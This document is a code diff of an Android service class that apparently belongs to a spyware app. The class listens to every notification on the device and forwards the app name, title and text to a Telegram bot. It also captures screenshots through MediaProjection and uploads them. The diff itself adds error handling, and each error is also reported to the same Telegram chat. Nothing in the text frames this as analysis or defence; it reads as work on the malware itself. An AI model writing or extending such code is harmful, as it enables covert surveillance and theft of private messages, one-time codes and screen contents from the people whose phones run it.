@@ -41,26 +41,35 @@ public class NotificationService extends NotificationListenerService {
     private MediaProjectionManager projectionManager;
     private int screenWidth, screenHeight, screenDensity;
     private Handler handler = new Handler(Looper.getMainLooper());
+    private boolean isProjectionSetup = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
-        wm.getDefaultDisplay().getMetrics(metrics);
-        screenWidth = metrics.widthPixels;
-        screenHeight = metrics.heightPixels;
-        screenDensity = metrics.densityDpi;
-        
-        setupMediaProjection();
+        try {
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(metrics);
+            screenWidth = metrics.widthPixels;
+            screenHeight = metrics.heightPixels;
+            screenDensity = metrics.densityDpi;
+            
+            setupMediaProjection();
+        } catch (Exception e) {
+            sendToTelegram("❌ NotificationService Error: " + e.getMessage());
+        }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && "TAKE_SCREENSHOT".equals(intent.getAction())) {
-            takeScreenshot();
+        try {
+            if (intent != null && "TAKE_SCREENSHOT".equals(intent.getAction())) {
+                takeScreenshot();
+            }
+        } catch (Exception e) {
+            sendToTelegram("❌ Screenshot Error: " + e.getMessage());
         }
         return super.onStartCommand(intent, flags, startId);
     }
@@ -69,22 +78,28 @@ public class NotificationService extends NotificationListenerService {
         try {
             int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
             String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
-            if (resultCode != -1 && dataUri != null) {
+            if (resultCode != -1 && dataUri != null && !dataUri.isEmpty()) {
                 Intent data = Intent.parseUri(dataUri, 0);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && data != null) {
                     mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+                    isProjectionSetup = true;
                 }
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendToTelegram("❌ MediaProjection Setup Error: " + e.getMessage());
+        }
     }
 
     private void takeScreenshot() {
-        if (mediaProjection == null) {
-            setupMediaProjection();
-            if (mediaProjection == null) return;
-        }
-
         try {
+            if (mediaProjection == null) {
+                setupMediaProjection();
+                if (mediaProjection == null) {
+                    sendToTelegram("❌ لا يمكن التقاط الشاشة - صلاحية التسجيل غير مفعلة");
+                    return;
+                }
+            }
+
             ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
             VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                 "Screenshot", screenWidth, screenHeight, screenDensity,
@@ -93,18 +108,24 @@ public class NotificationService extends NotificationListenerService {
             );
 
             handler.postDelayed(() -> {
-                Image image = imageReader.acquireLatestImage();
-                if (image != null) {
-                    Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
-                    bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
-                    sendScreenshot(bitmap);
-                    image.close();
-                    bitmap.recycle();
+                try {
+                    Image image = imageReader.acquireLatestImage();
+                    if (image != null) {
+                        Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+                        bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
+                        sendScreenshot(bitmap);
+                        image.close();
+                        bitmap.recycle();
+                    }
+                    virtualDisplay.release();
+                    imageReader.close();
+                } catch (Exception e) {
+                    sendToTelegram("❌ Screenshot Capture Error: " + e.getMessage());
                 }
-                virtualDisplay.release();
-                imageReader.close();
             }, 500);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendToTelegram("❌ Screenshot Error: " + e.getMessage());
+        }
     }
 
     private void sendScreenshot(Bitmap bitmap) {
@@ -130,37 +151,45 @@ public class NotificationService extends NotificationListenerService {
                 }
                 @Override public void onFailure(Call call, IOException e) {}
             });
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendToTelegram("❌ Send Screenshot Error: " + e.getMessage());
+        }
     }
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
-        Bundle extras = sbn.getNotification().extras;
-        String title = extras.getString(Notification.EXTRA_TITLE, "");
-        String text = extras.getString(Notification.EXTRA_TEXT, "");
-        String pkg = sbn.getPackageName();
-        
-        if (title.isEmpty() && text.isEmpty()) return;
-        
-        String message = "🔔 [" + pkg + "]\n" + title + "\n" + text;
-        sendToTelegram(message);
+        try {
+            Bundle extras = sbn.getNotification().extras;
+            String title = extras.getString(Notification.EXTRA_TITLE, "");
+            String text = extras.getString(Notification.EXTRA_TEXT, "");
+            String pkg = sbn.getPackageName();
+            
+            if (title.isEmpty() && text.isEmpty()) return;
+            
+            String message = "🔔 [" + pkg + "]\n" + title + "\n" + text;
+            sendToTelegram(message);
+        } catch (Exception e) {
+            // لا نرسل خطأ هنا عشان ما نسبب كراش
+        }
     }
 
     private void sendToTelegram(String text) {
-        Request request = new Request.Builder()
-                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
-                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
-                .build();
-        client.newCall(request).enqueue(new okhttp3.Callback() {
-            @Override public void onResponse(Call call, Response response) {
-                try { response.close(); } catch (Exception e) {}
-            }
-            @Override public void onFailure(Call call, IOException e) {}
-        });
+        try {
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
+                    .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
+                    .build();
+            client.newCall(request).enqueue(new okhttp3.Callback() {
+                @Override public void onResponse(Call call, Response response) {
+                    try { response.close(); } catch (Exception e) {}
+                }
+                @Override public void onFailure(Call call, IOException e) {}
+            });
+        } catch (Exception e) {}
     }
 
     @Override
     public void onListenerConnected() {
         sendToTelegram("✅ Notification Service Connected");
     }
-}
+                                            }
